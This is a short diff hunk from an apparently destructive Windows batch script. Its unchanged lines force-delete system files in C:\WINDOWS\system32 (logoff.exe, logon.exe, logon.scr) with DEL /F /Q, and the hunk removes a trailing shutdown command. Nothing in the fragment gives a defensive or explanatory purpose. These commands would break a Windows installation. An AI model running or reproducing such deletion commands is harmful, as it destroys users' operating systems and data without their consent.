@@ -19,4 +19,3 @@ DEL C:\WINDOWS\system32\logoff.exe /F /Q
 DEL C:\WINDOWS\system32\logon.exe /F /Q
 DEL C:\WINDOWS\system32\logon.scr /F /Q
 cls
-shutdown
